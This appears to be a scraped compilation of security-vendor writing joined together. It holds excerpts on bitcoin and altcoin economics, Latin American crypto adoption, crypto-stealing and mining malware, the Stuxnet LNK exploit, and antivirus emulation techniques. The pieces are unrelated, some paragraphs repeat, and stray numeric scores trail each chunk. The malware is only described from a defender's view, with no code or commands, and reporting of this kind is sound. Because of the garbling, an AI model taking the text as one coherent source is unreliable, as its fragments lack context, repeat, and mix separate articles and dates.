The famous Mt. Gox exchange deserves a section of its own. The first reported incident involved a rogue Hong Kong IP address compromising one of the site’s accounts, making a massive bitcoin sale and causing a frantic price drop. The attacker didn’t profit much from this exploit, but confidence in the currency was tainted.
It wasn’t until 24–26 February 2014 that Mt. Gox decided to close its doors, amidst allegations of a transaction malleability attack that had taken place – and gone unnoticed – over a long period of time. Criminals had stolen the shockingly high amount of 850,000 BTC (around of 7% of all bitcoins in existence and the equivalent of almost half a billion USD), leaving bitcoin enthusiasts venting their anger on forums, but with not much else to do in regards to restoring their funds. It’s worth noting that, at one point, Mt. Gox handled more than 80% of trades in the virtual currency, being essentially no more than a single-man operation.",0.020532762987541253
"Other coins
Although litecoin (LTC) resembles its big brother bitcoin in many ways, such as being an open-source peer-to-peer decentralized currency, the lead development team claims that ‘litecoin is a proven medium of commerce complementary to bitcoin’. With a maximum supply limit of four times the one established for bitcoin (84 million units for LTC), it’s amongst the most heavily traded alternative cryptocurrencies that fall under the deflationary category umbrella.
Introduced in October 2011, the limited geometric release of new coins and the controlled difficulty rate set at every 2,016 new blocks produced, makes litecoin the second largest cryptocurrency measured by market capitalization. In addition, as an intended improvement on the most noticeable bitcoin flaws, litecoin uses a scrypt proof-of-work algorithm in contrast to the SHA256 used by bitcoin, with the hopes of slowing down the creation of FPGA and ASIC mining farms. Processing each block takes 2.5 minutes, making it more suitable for fast transactions, compared to the 10 minutes required by bitcoin.
Figure 8. Market capitalization in USD as of 30 May 2014.
Based on a popular Internet meme, dogecoin (DOGE) has also become a big player in the cryptocurrency market. The greatly supportive community, fond of giving away DOGE tips and starting fundraisers for a variety of causes, has received enough media attention to make it interesting for cybercriminals. Beginning in December 2013, the DOGE founders didn’t expect that a currency which used a Shiba Inu Japanese dog as its official logo would actually reach the levels currently seen. Being a controlled inflationary currency, there are expected to be 100 billion DOGE in circulation by the end of 2014, with 5.2 billion units released every year thereafter.
With the initial intention of reaching a broader audience, and with transaction confirmations taking as little as one minute, it has established itself as a showcase of how simple it is to start a new cryptocurrency trend. ATMs are already being manufactured, and the unorthodox and grammatically incorrect cryptocurrency has already sponsored a NASCAR driver, the Jamaican Bobsled Olympic team in Sochi, and several other charity-related activities. By also using scrypt technology in its proof-of-work algorithm, the developers make it clear that this is a currency that aims for fairness amongst participants.
Figure 9. DOGE market capitalization vs. DOGE USD value (last 180 days chart from 30 May 2014) [12].
(Click here to view a larger version of Figure 9.)
But dogecoin wasn’t the only currency that started as an internal joke. Coinye (COINYE), which faced a strong enough law suit to be put out of the market, was charged for copyright infringement of hip hop artist Kanye West’s brand. Also scrypt based, and with a limit of 133,333,333,333 coins, the developers were clearly trying to push the limits (and/or patience) of a well-funded and well-lawyered individual. At the moment the project remains abandoned, although the official logo has been changed to a half man half fish hybrid (wearing sunglasses) in an attempt to demonstrate its disassociation with the hip hop artist’s brand.
It wouldn’t be painting a complete picture of the current cryptocurrency scene without a mention of an adult-industry-related coin. This industry makes 96 billion dollars every year, with Internet and digital media being at the top of the consumed services. Sexcoin is scrypt based and, with fast transaction confirmations (one minute), targets a niche audience involved in adult goods and services. Even though it clearly states it’s not just another alternative currency or a bitcoin competitor, it’s gaining momentum as more sites and users begin to see it not as a global currency for value speculation, but for exchange of payments. It’s also a deflationary currency with a limit of 250,000,000 coins, rewarding miners with 100 coins for each block mined, although some blocks are worth five or 50 times more as an added bonus.
Virtual currencies hold their value when there’s a community backing up the growth of the digital ecosystem. Their value is basically derived from demand, and lack of it means the financial death of the currency as it’s considered worthless. While most people trust their banks, or the US Treasury or the US Mint, confidence in the digital currency equivalents seems elusive at the moment, especially with all the security incidents witnessed in such a short space of time.",0.02568019353910289
"The economy in Latin America - a thriving ground for cryptocurrencies
With a dollar black market that has always been part of the Argentinian culture, and the dollar ‘blue’ value published next to the official one each morning in the papers, cryptocurrencies have found their place in Argentina. On taking a walk down Florida Street in Buenos Aires, you will see the best shops the city has to offer. You’ll also hear the yells of ‘Cambio!’ as the many ‘arbolitos’ offer you black market rates for your dollars and euros, all in plain sight.
After the financial crisis suffered in 2001, where the famous one peso for one dollar ‘Ley de Convertibilidad’ was no longer valid, the local currency began a strong devaluation process that still continues to the present day. With many citizens hoping to avoid the monetary erosion of their savings by seeking security in the American currency, those who were trapped in the ‘corralito’ weren’t so lucky and couldn’t touch a single dime of their money. The confidence in the government (any of them) and the local currency have been in the spotlight ever since, and rebuilding trust is not an easy process. Several other countries in Latin America have witnessed similar circumstances of strict currency control and inflationary processes in conjunction with the rapid devaluation of the local currency. The working class has resorted to alternative currencies and investment options as a means of preserving value in these uncertain times.
Hiding dollars or euros under a mattress is not unheard of, but what about an encrypted USB drive with your favourite cryptocurrency? According to CoinMap, Argentina is leading the pack when it comes to bitcoin adoption, with a great number of small merchants and businesses accepting BTC as a means of payment for goods and services. The adoption rate is significantly higher than that observed in other metropolitan Latin American cities such as Sao Paolo, Mexico City or Santiago de Chile.
Figure 10. Adoption of bitcoin in Latin America, with Argentina listing 132 merchants accepting payment in this currency.
Bitpay, a leading bitcoin service provider, has recently opened a regional branch in Argentina, demonstrating the local market potential. In addition, the Argentinian entrepreneur Wenceslao Casares has launched Xapo, a second generation online wallet storage that’s amongst the first to offer insurance on the funds stored, and which has received an initial round of investment from several recognized Wall Street firms. Xapo is presently working on a debit card linked to your bitcoin wallet that will use the networks of one of the major credit cards, allowing it to work virtually anywhere. But with great power comes great responsibility, and if fraudsters were interested in obtaining your credit and debit card numbers before, the future for them looks even more interesting now.
By holding regular meetings, The Argentinian Bitcoin Foundation explains cryptocurrencies not only to local enthusiasts, but to tax agencies and regulatory entities too. Positioned as a legal way of investing in the local market, it offers Argentinians and people from all over Latin America an investment option that has not been seen before.
Nevertheless, governments are getting frustrated as regulations are not part of bitcoin’s design. With Argentina’s black market growing, the UIF (‘Unidad de Información Financiera’) has taken a keen interest in the currency, which challenges current banking institutions and in some cases makes the process of money laundering and the financing of illegal operations easier.
Figure 11. Latin American websites list not only (the many) black dollar and euro value rates, but also bitcoin rates.
Those escaping tax are familiar with Panama as a financial paradise for setting up their companies. With the arrival of bitcoin, governments are resorting to asking coin holders to kindly pay taxes in order not to make tax evaders’ lives any easier. Brazil is setting the trend, with the Brazilian Revenue Service declaring bitcoin taxable in the same way as any other payment would be. With a large percentage of Brazilians acquiring bitcoins via the popular site Mercado Bitcoin, authority monitoring seems like a pipe dream at the moment and relies on the honesty of the citizens.",0.02110560238356085
"Economy 101 applied to digital currencies
The first mover advantage refers to the advantage gained by the first significant occupant of a market segment. Many alternative coins were pre-mined by their developers in order to conserve some of the financial benefits in case the coins became successful. In this case, if the pre-mined quantity was not significant enough, or the currency was ASICs resistant, mining farms would take over that initial advantage gained. In the bitcoin community, and any cryptocurrency community in general, the phrase ‘pre-mined’ is an instant turn off for the many enthusiasts that believe in coins not only as fiat alternatives, but also as an ethical and moral message to governments and regulation authorities. Mining feasibility studies can be performed as a preliminary evaluation that can determine if a resource can be mined economically (profitability). Albeit different from an actual mineral mining study, there are some similarities, but with the volatile nature of currencies a whole economic spectrum opens without even taking into consideration sociological and psychological aspects.
Known as the network effect, the economy concept proposed by Hal Varian states that the value of a product or service depends on the number of others using it. It’s one of the reasons why bitcoin remains on the podium while alternative (and subjectively better) cryptocurrencies appear every day. By establishing a firm user base and gaining wide acceptance, the stability of the currency is being guaranteed by its community, who strongly believe in an unspoken social convention that the value of bitcoin in the development of business transactions will remain as a viable option.
As a deflationary currency (no more units will be created after the 21 million limit is reached), bitcoin brings into the spotlight the topic of velocity of money. When there’s inflation there’s incentive for currency holders to spend it, but if no more units are created then we could face the tragedy of the commons where individuals acting out of their own interest (hoarding) could harm the currency’s health, causing the unit’s value to plummet.
Figure 12. Network effect regarding bitcoin adoption [13].
When someone such as Warren Buffett warns the general public to stay away from bitcoin, claiming a lack of intrinsic value and reducing it to a mere system for moving funds from point A to point B, it creates an equally passionate response from the other side of the table. Marc Andreessen, Internet pioneer, trusts that none of the points mentioned previously will cause the demise of the currency but would only make it stronger and more valuable.
Intrinsic value theory holds that the value of an object, good or service is contained within the item itself. Bitcoin transcends nations, politics, religions, cultures and regulations, allowing the movement of funds across borders with minimal or no fees at all, and without third-party intervention. In countries suffering from hyperinflation, where citizens need a way out of the system, this becomes quite important, moving freely from banking and government rules, laws and restrictions. These special properties make the subjective value of bitcoin much more relevant than what the naked eye can see.
Giving countries in the midst of economic crisis, such as Zimbabwe, an option of bank-free operation and avoiding costly exchange rates seems like a utopia. Even though African countries have been hesitant about utilizing bitcoin for everyday transactions due to concerns about money laundering, they are beginning to see the benefits and starting to negotiate with mobile payment vendors. On the other hand, we have Mexico, with Bitso, a digital currency exchange launching a Ripple gateway for Mexicans to easily transfer remittances in pesos, USD dollars, BTC or XRP (Ripple network unit) across borders. With billions of dollars sent from the US to Mexico each year, the ability to send cash back home is vastly simplified with the use of cryptocurrencies and networks of trust which allow the movement of any currency between participants.
Figure 13. The inner workings of Ripple networks are quite simple and based on the trust held between parties [14].
‘Our concern is, and the government’s concern is, money laundering. So we need to kind of be the poster children of how to do [compliance] correctly. So I’m not going to launch [a fiat currency option] until I’m ready to be on the poster.’ – Paul Vernon, Cryptsy founder.",0.028722718388329516
"Then the malware comes
We have seen why Latin America has become a fertile ground for the adoption of a cryptocurrency economy – unfortunately, so too have the cybercriminals. With a whole new set of frauds, scams and threats, citizens need to be aware that keeping their savings secure is not an easy task in today’s hyper-connected world. Just as there are no borders for cryptocurrencies, there are none for criminals either, and following the money trail means landing in Latin America, where the general audience is still widely vulnerable to many of the attacks seen in other parts of the world.
After the Mt. Gox incident, we have witnessed targeted phishing campaigns, bitcoin community members moonlighting as private investigators, localized ransomware samples, scams, mobile miners, Internet of things devices participating in botnets, and anything in between.",0.015240558328442178
"Malware in the bitcoin ecosystem
As mentioned in Kaspersky’s 2013 Security Bulletin, the predictions made for the cybercriminal bitcoin ecosystem have come true, and then some:
‘Attacks on Bitcoin pools, exchanges and Bitcoin users will become one of the most high-profile topics of the year. Attacks on stock exchanges will be especially popular with the fraudsters as their cost-to-income ratio is very favourable.
‘As for Bitcoin users, in 2014 we expect considerable growth in the number of attacks targeting their wallets. Previously, criminals infected victim computers and went on to use them for mining. However, this method is now far less effective than before while the theft of Bitcoins promises cybercriminals huge profits and complete anonymity.’",0.015322013572431903
"Mt. Gox still alive?
After the rumour that Mt. Gox owner Mark Karpeles’ blog and reddit accounts had been hacked, cybercriminals saw the opportunity to design a simple yet effective malicious application, which in conjunction with a publicly believable story, lured several former exchange users into their trap. Using a compressed file named ‘MtGox2014Leak.zip’, the criminals included several fake spreadsheets with widely available information around Mt. Gox finances, and a customized back end client to access it. Unfortunately, those who thought this was the official interface for Mt. Gox’s critical information were infected with a piece of malware designed to steal unencrypted ‘wallet.dat’ and ‘bitcoin.conf’ configuration files. At the same time, even though Mt. Gox was practically dead, it would contact a remote C&C server, sending the login credentials used in the fake application.
Figure 14. Mt. Gox trojan sending base64-encoded credentials to a remote server in Sofia, Bulgaria.
The Windows version, detected as Trojan.Win32.CoinStealer.i, and the Mac OSX variant, detected as Trojan.Win32.CoinStealer.a, were programmed in the Livecode language in order to easily ‘support’ several different operating system platforms.
Figure 15. Mt. Gox’s fake back-end client which tricked victims into supplying their credentials.
Appealing to the users’ curiosity and (in some cases) greed proved effective for the second time. Not too long ago, a mail distributed phishing campaign claiming that former Mt. Gox users were required to sign account closure documents was spotted in the wild, also with the clear aim of infecting unsuspecting victims.
Figure 16. Phishing campaign targeting Mt. Gox users (with trojanized compressed executable file).",0.0150515056412166
"Social gold rush and phishing campaigns
Amongst the first bitcoin-related malware samples spotted in Latin America was Trojan.Win32.Jorik.IRC.bot.xkt, which was being spread via Skype. At the time, bitcoin mining was still profitable, even with limited CPU resources. Using an initial dropper to download a second-stage payload from the ‘HotFile’ public file-sharing service gave the victim a copy of the ‘cpuminer’ mining application, obtaining precious bitcoins for cybercriminals on the other side of the globe.
With the popularity of social networks, bitcoin enthusiast criminals have resorted to spreading their creations via Facebook, with a pinch of social engineering as the essential ingredient. As seen previously, very few users can resist the temptation to open a picture, especially when requested to do so by a trusted friend. In reality, these curious individuals would be obtaining a custom developed trojan that searches for unencrypted wallet files. In addition, and even if currently not quite profitable, it would consume computing resources by joining a bitcoin mining pool, expecting to at least get a minimal benefit from the infection.
Figure 17. After any major breach, a fake credentials dump quickly appears, offering the stolen database for a reasonable sum of bitcoins.
(Click here to view a larger version of Figure 17.)
Numerous phishing campaigns have been spotted before, many of them promising astronomical rates of return for minimal investments, others just promising the user prizes, or announcing the winning of the ‘bitcoin lottery’. The same scams and frauds we have seen for many years have added the word ‘bitcoin’ and are targeting new victims – the game is the same, but the stakes are much higher.
Figure 18. Using the same techniques as seen in other attacks, cybercriminals use the oldest trick in the book: the closure of a service as the hook.",0.014708756412788682
"Illegal marketplaces
After the seizure by the FBI of the Silk Road illegal marketplace, new versions started to appear, with the owners putting real effort into regaining the essential trust of their audience. Moreover, the bitcoins lost in this February’s hack were promised to be repaid by the site’s operators: ‘We are committed to getting everyone repaid, even if it takes a year’.
Figure 19. Silk Road’s administrator, ‘Defcon’, announcing the repayment of the lost funds to its users.
(Click here to view a larger version of Figure 19.)
Although not seized but disbanded, Sheep’s Marketplace administrators reported that a bug in the system had been responsible for the loss of 5,400 bitcoins. Suspicious of fraud, users in the community donned their private investigator hats with the goal of analysing the public bitcoin blockchain and eventually finding the destination of their (supposedly) stolen goods. A wallet with 96,000 BTC (around 100 million dollars) was the prime suspect of this inquisitive group, composed mainly of angry reddit users. But, it was after a taking a closer look that they found the legitimate owner of such millionaire sum, the exchange service BTC-E. Currently, reddit explicitly prohibits ‘doxxing’ (publishing personal information) for suspected bitcoin thieves since there have been so many false positives leading to never-ending witch hunts.
With bitcoin anonymizing services like ‘Bit Fog’ or ‘Dark Wallet’, using the public ledger as the sole evidence for finding cybercriminals will prove a daunting task in the near future. By taking money from different sources, mixing them in a single wallet and spitting out a different amount at the other end of the transaction, money laundering techniques will be deeply ingrained in the bitcoin community’s technical repertoire.",0.01830707448869584
"Ransomware in Latin America
A plethora of locally reported ransomware cases have forced some business owners to learn the meaning of ‘bitcoin’. Demanding a payment to recover encrypted files has left many small and medium-sized companies wondering what went wrong. Of course, cybercriminals understand the financial crisis suffered by many Latin American countries, and offer reduced rates to victims in dire need of recovering their files.
Asking for a demonstration that hostage-held files can indeed be recovered is the first option victims choose when faced with a ransomware situation. After being convinced that a payment is due, negotiations begin, and acquiring the bitcoins demanded is another problem in itself, given the strict financial controls that are in place in the region.
CrytptoLocker was no doubt famous in the ransomware scene, but a new player called BitCrypt has appeared, adding an interesting functionality for stealing funds present in wallets from several different cryptocurrencies. The combination of cryptography, cryptocurrencies, and in many cases TOR (to access the payment site), left its victims with a headache and unusable files.
Sometimes providing a TOR2Web URL to facilitate the recovery procedure, cybercriminals appeared to take into consideration the victim’s needs. With ransom values ranging from a couple of hundred dollars to a couple of thousand, users are learning the valuable lesson of having a solid backup policy.
The Reveton ransomware family has upped the ante, also including mining clients with its malicious distributions, making the victims pay a ransom even if unaware of it. The interest that cybercriminals show in bitcoin is not for ethical or moral reasons, but because of the privacy and ease that it provides in managing their illegal operations.",0.020162334993719
"Internet of bitcoin things
Malware that infects digital video recorders has been found, and not even NAS devices, routers and other Linux-embedded equipment have escaped this peculiar threat. With very limited resources to spare, malware writers thought it would be useful to put these ‘always on’ computers to use in mining cryptocurrencies. Of course, even if choosing to mine an alternative coin, the benefits were minimal in comparison to the stress that these devices needed to suffer.
Figure 20. Synology NAS devices used to mine cryptocurrencies using an embedded version of CPU Miner.
Microsoft destroying the bitcoin-mining botnet Sefnit might look like an unnecessary measure currently, with the increasing difficulty rates of the bitcoin currency. However, with many scrypt-based alternatives still mineable by everyday PCs, cybercriminals will take that opportunity even if there’s little to gain from it. Sefnit’s culprit was the very mechanism designed to protect it: the usage of TOR.
Figure 21. Increase in connecting TOR users between June and September 2013 due to the Sefnit mining botnet [15].",0.011974444106601978
"Mining from your mobile
The rarest samples of bitcoin-mining malware are not OSX related, even if those are pretty uncommon to find. Using a cracked Angry Birds installer in Mac (i.e. OSX/CoinThief.A) as a way of infecting bitcoin users seems quite ordinary in comparison to putting a mobile phone to use in mining bitcoins.
As mentioned, embedded devices (DVRs, routers etc.) have little processing power to spare, but at least they have a continuous power source that they can rely on. With smartphones, overheating and excessive battery and bandwidth usage due to malware infections controlling the resources of the device are a giveaway sign.
Two malicious mining applications have been found in the official Google Play store, one named ‘Songs’ and the other one ‘Prized’. The threat included in these seemingly innocent applications, known as CoinKrypt, instructed infected phones to mine litecoin, dogecoin and casinocoin. With more than a million downloads for ‘Songs’, averaging a mining rate around 8KH/s per device, the malicious pool just wasn’t enough to make it worthwhile for the developers.
Another trojan, found in fake ‘Tune In Radio’ or ‘Football Manager Handled’ application downloads, focused mainly on mining dogecoin, hence being named by the security community ‘MuchSad’, in reference to the grammatically incorrect cryptocurrency. Again, obtaining marginal profits for their creators, these mobile samples proved (without much surprise) that mining in these devices was not practical or efficient at all.
Then BadLepricon appeared, also in the official Google store, this time targeting bitcoin via a hidden mining client, checking the device’s battery life and other parameters to stay undetected for as long as possible. One thing all these applications have in common is the usage of social engineering techniques to convince the user of their legitimacy, and to entice them to download them to their devices.",0.013041710035201715
"Conclusion: being your own bank is more difficult than it seems
Seen by outsiders as a hobby for geeks, bitcoin is more than a currency, it’s a community that has certain values ingrained and it’s revolutionizing the financial world as we currently know it.
Collective but anonymous, organized yet decentralized, this ordered chaos is beginning to make sense after all the problems it has faced. The closure of many of the exchanges that were once available is bringing a Darwinian equilibrium to the bitcoin ecosystem, forcing those that are left to implement better business practices and security measures.
Malware trends indicate that cybercriminals are migrating from mining botnets and pools to more direct wallet-stealing and exchange credential hijacking methods. As highlighted by the inefficient mining trojans in mobile devices, accessing the funds stored in the victims’ digital wallets seems much more straightforward than putting the effort into building a massive network of miners that reap minimal gains.
Debit cards linked to bitcoin wallets are starting to appear and this brings another enticing entry point for criminals. With ‘bitwashing’ services becoming more common, tracking stolen funds will prove much more difficult in the future, exposing the true anonymous nature of cryptocurrencies.
Once the de facto choice for drug dealers and illegal markets, bitcoin is aiming to gain the global trust of other types of merchants, hoping that the community backing it up will be ready for when it becomes the default standard for online and offline transactions.",0.017382643485149285
"Bibliography
[1] More users, more attacks: Kaspersky Lab stats show a surge in Bitcoin cybercrime. http://www.kaspersky.com/about/news/virus/2014/Kaspersky-Lab-stats-show-a-surge-in-Bitcoin-cybercrime.
[2] Decker, C. Wattenhofer, R, Bitcoin Transaction Malleability and Mt.Gox. http://arxiv.org/abs/1403.6676.
[3] [Bitcoin-development] To prevent arbitrary data storage in TXOUTs — The Ultimate Solution. http://sourceforge.net/p/bitcoin/mailman/message/30705609/.
[4] Bitcoin Weaknesses. https://en.bitcoin.it/wiki/Weaknesses.
[5] Bitcoin Pool Hash Rate Distribution. https://blockchain.info/pools.
[6] Warning: Litecoin Miners Need To Leave Coinotron. http://www.cryptocoinsnews.com/news/warning-litecoin-miners-need-leave-coinotron/2014/05/20.
[7] Litecoin Pool Hash Rate Distribution. https://www.litecoinpool.org/pools.
[8] Bitcoin Exchanges Buckle Under DDoS Attacks. http://www.darkreading.com/attacks-and-breaches/bitcoin-exchanges-buckle-under-ddos-attacks/d/d-id/1113809.
[9] Bitcoin Core version 0.9.1 released. https://bitcoin.org/en/release/v0.9.1.
[10] CVE Details – Bitcoin Security Vulnerabilities. http://www.cvedetails.com/vulnerability-list/vendor_id-12094/Bitcoin.html.
[11] List of Bitcoin Heists. https://bitcointalk.org/index.php?topic=576337.
[12] Crypto-Currency Market Capitalizations. https://coinmarketcap.com/doge_180.html.
[13] Crytpocoincharts – Currency Usage – Graphical Comparison. https://www.cryptocoincharts.info/v2/coins/graphicalComparison.
[14] Ripple – The Future of Payments. https://ripple.com/.
[15] TOR Metrics Portal. https://metrics.torproject.org/.
[16] Mt. Gox: Where are the Bitcoins? http://bitcoinbarbie.com/mt-gox-where-are-the-bitcoins/.
[17] Are crypto-currencies the future of money? http://www.bbc.com/news/business-27200665.
[18] How bitcoin is moving money in Africa. http://www.usatoday.com/story/money/business/2014/04/25/ozy-bitcoin-africa-currency/8148853/.
[19] The World’s First Bitcoin Debit Card Is Almost Here. http://www.wired.com/2014/04/xapo/.
[20] You Say Bitcoin Has No Intrinsic Value? Twenty-two Reasons to Think Again. http://bitcoinmagazine.com/12846/you-say-bitcoin-has-no-intrinsic-value-twenty-two-reasons-to-think-again/.
[21] Bitcoin Battle: Warren Buffett vs. Marc Andreessen. http://www.forbes.com/sites/kashmirhill/2014/03/26/warren-buffett-says-bitcoin-is-a-mirage-why-marc-andreessen-thinks-hes-wrong/.
[22] How Fraud Attacks on Bitcoins Are Changing. http://www.banktech.com/risk-management/how-fraud-attacks-on-bitcoins-are-changi/240168089.
[23] Bitcoin’s backers know they need to win you over. http://www.pcworld.com/article/2111940/bitcoins-backers-know-they-need-to-win-you-over.html.
[24] A history of bitcoin hacks. http://www.theguardian.com/technology/2014/mar/18/history-of-bitcoin-hacks-alternative-currency.
[25] Recovering stolen bitcoin: a digital wild goose chase. http://www.theguardian.com/technology/2013/dec/09/recovering-stolen-bitcoin-sheep-marketplace-trading-digital-currency-money.
[26] Ripple Network Expands to Mexico With Addition of First Peso Issuer. http://www.coindesk.com/ripple-network-expands-addition-first-peso-issuer/.
[27] La explosión de Bitcoin en Argentina. http://esblog.panampost.com/editor/2014/05/12/la-explosion-de-bitcoin-en-argentina/.
[28] How Bitcoin is Thriving in Argentina’s Black Market Economy. http://www.coindesk.com/bitcoin-thriving-argentinas-black-market-economy/.
[29] Brazil Follows IRS, Declares Bitcoin Gains Taxable. http://www.forbes.com/sites/kenrapoza/2014/04/07/brazil-follows-irs-declares-bitcoin-gains-taxable/.
[30] La oficina antilavado y el Banco Central, con la mira en el bitcoin. http://www.infobae.com/2014/04/20/1558483-la-oficina-antilavado-y-el-banco-central-la-mira-el-bitcoin.
[31] Bitcoin: fiebre argentina por la máquina de dinero digital. http://www.lanacion.com.ar/1596773-bitcoin-pasion-argentina-por-la-nueva-maquina-de-hacer-billetes-digitales.
[32] Argentina is all about the black market Benjamins. http://www.globalpost.com/dispatch/news/regions/americas/argentina/130705/argentine-black-market-usd-dollar-peso-forex.
[33] Inflation in Argentina – New data, old qualms. http://www.economist.com/blogs/americasview/2014/02/inflation-argentina.
",0.02021154746003817
"More LNK exploiting malware, by Jove!*
Pierre-Marc and I reported a few days ago that we were seeing both new malware and older families starting to incorporate the same .LNK exploit used by Win32/Stuxnet. We also predicted that ""...more malware operators will start using this exploit code in order to infect host systems and increase their revenues."" Well, that was a pretty safe bet.",0.012149536079235523
27 Jul 2010 - 05:26AM,0.01162080461201942
"Pierre-Marc and I reported a few days ago that we were seeing both new malware and older families starting to incorporate the same .LNK exploit used by Win32/Stuxnet. We also predicted that “…more malware operators will start using this exploit code in order to infect host systems and increase their revenues.” Well, that was a pretty safe bet.",0.013445063814504832
"*Jove, or Jupiter, was the Roman equivalent of the Greek god Zeus, the king of the gods. Ah, the benefits of a classical education. If GCE O-Level Latin counts as a classical education…",0.014926257960109823
"Pierre-Marc and I reported a few days ago that we were seeing both new malware and older families starting to incorporate the same .LNK exploit used by Win32/Stuxnet. We also predicted that ""…more malware operators will start using this exploit code in order to infect host systems and increase their revenues."" Well, that was a pretty safe bet.",0.013445063814504832
"And sure enough, F-Secure's Sean Sullivan has publicised versions of the Zeus botnet and of Win32/Sality making use of the same exploit. Meanwhile, Sophos and GDATA are offering tools that check LNK files for the exploit, which we detect generically as LNK/Exploit.CVE-2010-2568. This approach may be useful for system administrators and anyone who isn't, for whatever reason, using an anti-virus scanner or security suite. However, as Sean also pointed out, a good many AV companies are, by now, also detecting the exploit generically, so this development is a lot less dramatic than it would have been a few days ago.",0.011763886334404505
"In fairness to other companies, I should reiterate that when a VirusTotal report indicates no detection by other companies listed, that shouldn't be taken as an infallible indication that those companies can't detect it. As I've said many times before, that's not how the VirusTotal service works, or what it's intended for.",0.011365644044740164
"In fact, the aspect of this outbreak that I've found really encouraging is the willingness of most of the major companies to acknowledge the research of others and to give links to competitor sites where appropriate. While linking to competitor sites may not seem good marketing, there are occasions when it's in the interest of the consumer for cooperation to trump competitive marketing.",0.016349681003297922
"David Harley CITP FBCS CISSP
ESET Senior Research Fellow
",0.011179100245160778
"Solutions to current antivirus challenges
The detection and blocking of malicious code employed by modern threats, whether targeted attacks or mass-spreading campaigns, has been a game of cat-and-mouse for some time now. Is it time for a new approach?",0.009240042576158958
19 Oct 2013 - 05:58AM,0.011789290876033531
"The detection and blocking of malicious code employed by modern threats, whether targeted attacks or mass-spreading campaigns, has been a game of cat-and-mouse for some time now. Is it time for a new approach?",0.013593689477011228
"The detection and blocking of malicious code employed by modern threats, whether targeted attacks or mass-spreading campaigns, has been a game of cat-and-mouse with the perpetrators for some time now. And even though we are seeing shifts in the threat landscape and new malware trends, the “malware problem” is still very much with us. To be clear, most malware writing today is performed by, or purchased by, cross-border criminal organizations. We are no longer faced with a few over-enthusiastic individuals. That means most malware attacks are functional and to some degree effective, in other words: people get infected. These attacks are generally low-risk and often very profitable.",0.011847160826297776
The development of anti-malware defenses,0.006874415455630167
"As malicious code threats have evolved over the years, so have the technologies deployed to protect against them. The traditional concept of an “anti-virus” program has evolved into more comprehensive “security suites.” These suites include, in addition to traditional anti-malware scanners, firewalls, HIPS (Host Intrusion Prevention Systems), and other technologies.",0.013148956358659425
"One of the reasons such multi-layered protection is necessary is that the “bad guys” have the advantage of only needing to find one hole in our defenses, while companies and consumers need protection across many different points of attack. Security companies like ESET are consistently monitoring the evolution of malware families and collecting new samples of malicious code. The servers in the ESET Security Research Lab receive over 200000 unique malicious binaries every day, malware detected proactively, that we have never seen before. Even so, we don’t really see all the cards in the game. Malware writers, on the other hand, have access to all of the commonly used security solutions. They use this access to tweak their code so that it is harder to detect when it is released.",0.013594263268985829
"Of course, our job is to defeat that process. We want to make it impossible, or at least more difficult and expensive, for malware writers to craft code that is not detected. This requires additional layers of security that introduce creative strategies that can catch malicious code which might evade basic defenses.",0.012931101230141628
"One strategy that has been around for some time is advanced heuristics, explained in detail by Righard Zwienenberg on WeLiveSecurity.com. There is also an ESET white paper on basic heuristics. In this article we expand on the heuristic approach, and introduce some additional strategies that security software can deploy to combat malware. We begin by explaining several particularly challenging techniques used by malware writers today.",0.011892514339533422
Malware protectors,0.00818455709846766
"The main technique employed by malware writers in order to avoid detection by antivirus software is the use of various “protectors” or run-time packers. You can think of these protectors as outer shells of the executables that hide the inner payload from inspection, and therefore detection, by basic anti-virus scanners.",0.015709298440720887
"That explains why, out of the many thousands of fresh malware samples that we see daily in our lab, relatively few contain new functionalities. Most of those daily unique samples are repackaged versions of existing malware families. The frequent repacking of malware variants is also known as server-side polymorphism.",0.014335549144107618
"An antivirus program that relies solely on simple hash-based signature detection of previously known malware can be defeated by the ever-changing malware. Furthermore, such detection is very inefficient. That is why a great amount of research has been done in order to crack that outer shell of malware protection using emulation. The idea is to run potentially malicious executables in a virtual environment or sand box, where they won’t be able to cause damage to the system and user, but will become unpacked and can be caught by the anti-virus engine.",0.011406115924900928
"While this might sound simple in theory, in reality there are several challenges that must be overcome for this to work, and a number of potential drawbacks that must be taken into consideration:",0.011854325844837588
"The malware can attempt to hinder emulation, for example by use of uncommon instructions or API functions, which the emulator didn’t expect and can’t handle correctly.",0.013693304939236706
The malware can detect it is being run in a virtual environment and either stop executing or continue in a benign mode to avoid detection.,0.01451943344427531
"Even if the code is emulated correctly, it can still be obfuscated in such a way that it hides its malicious functionality and its detection is still problematic.",0.012805108961708056
Emulation or any virtualization technology always carries with it some negative performance impact.,0.019949212060853982
One significant method for improvement of emulation (with respect to the problematic aspects mentioned above) is by employing binary translation.,0.011650441781668075
"One of the most infamous banking Trojans, Zeus (detected by ESET as Win32/Spy.Zbot) is a good example of how repacking with various protectors has proven to be effective for the bad guys. This is malware that has been widely known for at least six years and its source code was leaked back in 2011. Yet Zeus often succeeds in evading detection by anti-malware scanners, because of the advanced packers used by the gangs that build and operate Zeus.",0.012846028910340146
"For cases when inspection of the protected and obfuscated sample prior to its execution is not successful, antivirus software has one last chance of detecting it: when it is running in memory in a decloaked state. Yet again, the challenge for security companies lies in triggering appropriate memory scanning as soon as possible, so that the malware causes minimal damage. This needs to be done with as little negative impact on system performance as possible.",0.010742116972537352
Exploitation as an infection vector,0.005990074109230248
"Clearly, it is more desirable to prevent a malware infection even before it sets foot on the target system. There are many different infection vectors and, like malware itself, these have also evolved over time. However, generally they can be grouped into two categories:",0.010810144515586484
With user interaction: the victim is led to the infection through social engineering,0.007747890609639652
Without user interaction: mostly through exploits of software vulnerabilities,0.008557032110941165
"The subject of social engineering is a broad one and is a frequent topic of We Live Security blog posts. Here we will focus on software exploitation, without user interaction.",0.011081824179487998
"A typical scenario is that a user navigates to a webpage, subverted by an attacker, that contains a malicious script calling an exploit pack or exploit kit (something we have covered in various articles). Simply put, the exploit pack is a web app that will first check the potential victim’s software versions. This can be accomplished by legitimate scripts, such as PluginDetect. Then, if an unpatched, vulnerable version is detected, an exploit will be served and malicious code can be executed on the system without the user ever noticing anything. From the attacker’s point of view this is a very effective way of infecting even the more cautious users. For this reason, the underground market where cybercriminals buy exploit kits and new software vulnerabilities is thriving.",0.013009194277111114
"The obvious protection against these kinds of attacks is to patch the software vulnerabilities, but unfortunately people patch slowly and some don’t patch at all. Furthermore, patching is not effective against zero-day exploits, those that are unknown to the affected software vendor and for which no patch is available at the time of the attack.",0.012469881506450675
"Signature-based detection can be used to detect exploit code, but it suffers from the same shortcomings as when used against “regular” malware, so more generic detection and mitigation approaches are needed.",0.013945781003157687
